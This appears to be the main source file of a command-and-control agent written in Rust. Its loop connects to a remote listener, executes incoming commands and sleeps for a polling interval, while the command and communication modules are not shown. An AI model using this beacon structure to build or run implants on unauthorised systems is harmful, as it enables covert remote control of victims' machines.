pub mod command;
pub mod common;
pub mod setup;

extern crate alloc;
use alloc::sync::Arc;

use command::handler::command_handler;
use kageshirei_runtime::Runtime;
use mod_agentcore::instance;
use mod_win32::nt_time::wait_until;
use setup::{
    communication::initialize_protocol,
    runtime_manager::initialize_runtime,
    system_data::initialize_system_data,
};

fn main() {
    let rt = initialize_runtime();
    initialize_system_data();
    routine(rt.clone());
}

/// Downcasts a u128 to an i64 by taking the rightmost 64 bits of the u128.
///
/// # Example
///
/// ```rust
/// fn main() {
///     // Example u128 value                  v-- this is a 1
///     let value: u128 = 0b00000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111111111;
///
///     // Cast the value to i64
///     let result = downcast_rightmost_u128(value);
///
///     // Output: i64 = 0b0000000000000000000000000000000000000000000000001111111111111111
///     println!("i64 = 0b{:064b}", result);
/// }
/// ```
///
/// # Arguments
///
/// * `value` - The u128 value to downcast.
///
/// # Returns
///
/// The i64 value of the rightmost 64 bits of the u128.
fn downcast_rightmost_u128(value: u128) -> i64 {
    let mask = 0xffff_ffff_ffff_ffff;
    ((value & mask) as i128) as i64
}

pub fn routine<R>(rt: Arc<R>)
where
    R: Runtime,
{
    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                initialize_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            wait_until(downcast_rightmost_u128(instance().config.polling_interval));
        }
    }
}
